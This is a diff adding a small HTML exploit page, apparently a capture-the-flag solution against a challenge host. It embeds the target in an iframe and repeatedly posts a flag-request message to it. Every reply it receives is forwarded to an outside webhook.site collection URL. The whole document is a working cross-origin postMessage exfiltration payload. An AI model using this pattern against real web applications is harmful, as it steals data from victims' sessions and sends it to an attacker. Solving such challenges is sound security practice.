@@ -1,0 +1,10 @@
+
+<iframe id="ifr" src="https://chall1.jsapi.tech/?enableapi=true&recv=http://asdfasdf.jsapi.tech/" frameborder="0"></iframe>
+<script>
+    setInterval(() => {
+        document.getElementById("ifr").contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "https://chall1.jsapi.tech/")
+    }, 1000);
+    window.addEventListener("message", async(event) => {
+        fetch('https://webhook.site/a84484cc-d9a7-421d-8c55-dcd16eac2a69/?res=a' + event.data)
+    })
+</script>
